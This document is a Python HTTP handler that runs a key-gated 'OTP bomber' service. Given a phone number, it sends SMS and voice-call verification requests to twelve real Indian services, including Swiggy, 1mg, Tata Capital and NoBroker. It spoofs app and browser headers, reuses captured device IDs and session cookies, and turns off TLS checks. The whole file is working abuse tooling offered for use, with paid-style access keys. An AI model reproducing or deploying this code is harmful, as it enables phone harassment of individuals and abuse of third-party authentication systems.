import os
import json
import time
import asyncio
import aiohttp
import urllib.parse
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
from collections import defaultdict


rate_limit_cache = defaultdict(list)
MASTER_KEYS_FILE = os.path.join(os.path.dirname(__file__), "..", "masterkeys.txt")
KEYS_FILE = os.path.join(os.path.dirname(__file__), "..", "bombkeys.txt")

MAX_REQUESTS = 100
WINDOW_SECONDS = 180  
DELAY = 0.5  

APIS = [
    {
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "payload": {
            "mobileNo": "{number}",
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "emailId": "",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "payload": {"mobile_number": "{number}"},
        "headers": {
            "Mobilenumber": "{number}",
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        }
    },
    {
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{number}", "resend_otp": "resend_otp"},
        "headers": {
            "Host": "ekyc.daycoindia.com",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
            "Priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "payload": {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "course": "",
            "phone_number": "{number}",
            "language": "en",
            "udid": "b751fb63c0ae17ba",
            "class": "",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
        },
        "headers": {
            "version_code": "1160",
            "has_upi": "false",
            "device_model": "ASUS_I005DA",
            "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.2"
        }
    },
    {
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "payload": {"phone": "{number}", "countryCode": "IN"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
            "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
            "origin": "https://www.nobroker.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.nobroker.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "payload": {"mobileNumber": "{number}"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer null",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://app.shiprocket.in",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.shiprocket.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "payload": {"phone": "{number}", "applSource": "", "isOtpViaCallAtLogin": "true"},
        "headers": {
            "Content-Type": "application/json"
        }
    },
    {
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{number}"},
        "headers": {
            "Host": "api.penpencil.co",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "payload": {"number": "{number}", "is_corporate_user": False, "otp_on_call": True},
        "headers": {
            "Host": "www.1mg.com",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        }
    },
    {
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "payload": {"mobile": "{number}"},
        "headers": {
            "Host": "profile.swiggy.com",
            "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
            "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
            "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
            "pl-version": "55",
            "user-agent": "Swiggy-Android",
            "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
            "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
            "version-code": "1161",
            "app-version": "4.38.1",
            "latitude": "0.0",
            "longitude": "0.0",
            "os-version": "13",
            "accessibility_enabled": "false",
            "swuid": "4c27ae3a76b146f3",
            "deviceid": "4c27ae3a76b146f3",
            "x-network-quality": "GOOD",
            "accept-encoding": "gzip",
            "accept": "application/json; charset=utf-8",
            "content-type": "application/json; charset=utf-8",
            "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO"
        }
    },
    {
        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "payload": {"phone_number": {"number": "{number}", "country_code": "+91"}},
        "headers": {
            "Host": "api.kpnfresh.com",
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i"
        }
    },
    {
        "endpoint": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "payload": {"mobile_number": "{number}"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
    }
]

def load_keys(file_path):

    keys = {}
    try:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or ':' not in line:
                        continue
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        key, expiry = parts
                        keys[key] = expiry
    except:
        pass
    return keys

def is_master_key(key):
    try:
        if os.path.exists(MASTER_KEYS_FILE):
            with open(MASTER_KEYS_FILE, 'r') as f:
                master_keys = [line.strip() for line in f if line.strip()]
                return key in master_keys
    except:
        pass
    return False

def validate_key(key, ip):
    if is_master_key(key):
        return True, None
    

    keys = load_keys(KEYS_FILE)
    

    if key not in keys:
        return False, "Invalid API key"
    

    try:
        expiry_date = datetime.strptime(keys[key], "%d/%m/%Y")
        if datetime.now() > expiry_date:
            return False, "API key expired"
    except:
        return False, "Invalid expiry date format"
    

    now = time.time()
    cache_key = f"{key}:{ip}"
    

    if cache_key in rate_limit_cache:
        rate_limit_cache[cache_key] = [
            t for t in rate_limit_cache[cache_key]
            if now - t < WINDOW_SECONDS
        ]

    if len(rate_limit_cache.get(cache_key, [])) >= MAX_REQUESTS:
        return False, f"Rate limit exceeded. Max {MAX_REQUESTS} requests per {WINDOW_SECONDS/60} minutes"

    rate_limit_cache.setdefault(cache_key, []).append(now)
    
    return True, None

async def send_request(session, api, phone_number):
    try:
        payload = json.dumps(api["payload"]).replace("{number}", phone_number)
        payload_dict = json.loads(payload)
        

        headers = {}
        for k, v in api["headers"].items():
            if isinstance(v, str):
                headers[k] = v.replace("{number}", phone_number)
            else:
                headers[k] = v
        
        if api["method"] == "POST":
            if headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):

                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload_dict.items())
                async with session.post(
                    api["endpoint"],
                    data=payload_str,
                    headers=headers,
                    timeout=10,
                    ssl=False
                ) as response:
                    return response.status, api["endpoint"]
            else:

                async with session.post(
                    api["endpoint"],
                    json=payload_dict,
                    headers=headers,
                    timeout=10,
                    ssl=False
                ) as response:
                    return response.status, api["endpoint"]
        else:
            return 0, f"Unsupported method: {api['method']}"
            
    except Exception as e:
        return 0, str(e)

async def bomb_otp(phone_number):

    success = 0
    failed = 0
    results = []
    
    async with aiohttp.ClientSession() as session:
        for api in APIS:
            status, endpoint_or_error = await send_request(session, api, phone_number)
            
            if status in [200, 201]:
                success += 1
                results.append({"endpoint": endpoint_or_error, "status": "success", "code": status})
            else:
                failed += 1
                results.append({"endpoint": api["endpoint"], "status": "failed", "error": endpoint_or_error})
            

            await asyncio.sleep(DELAY)
    
    return success, failed, results

class handler(BaseHTTPRequestHandler):
    def do_GET(self):

        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        
        api_key = query_params.get('key', [None])[0]
        phone_number = query_params.get('number', [None])[0]
        

        ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip() or 'unknown'

        if not api_key:
            self.send_error_response(400, "API key is required (key parameter)")
            return
        
        if not phone_number or not phone_number.isdigit() or len(phone_number) != 10:
            self.send_error_response(400, "Valid 10-digit phone number is required (number parameter)")
            return
            
        valid, error_msg = validate_key(api_key, ip)
        if not valid:
            self.send_error_response(401, error_msg)
            return
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            success, failed, results = loop.run_until_complete(bomb_otp(phone_number))
            loop.close()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            response = {
                "status": "success",
                "phone_number": phone_number,
                "total_apis": len(APIS),
                "successful": success,
                "failed": failed,
                "delay_between_requests": f"{DELAY*1000}ms",
                "results": results
            }
            
            self.wfile.write(json.dumps(response, indent=2).encode())
            
        except Exception as e:
            self.send_error_response(500, f"Internal server error: {str(e)}")
    
    def send_error_response(self, code, message):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        
        response = {
            "status": "error",
            "error": message
        }
        
        self.wfile.write(json.dumps(response, indent=2).encode())
    
    def log_message(self, format, *args):
        pass
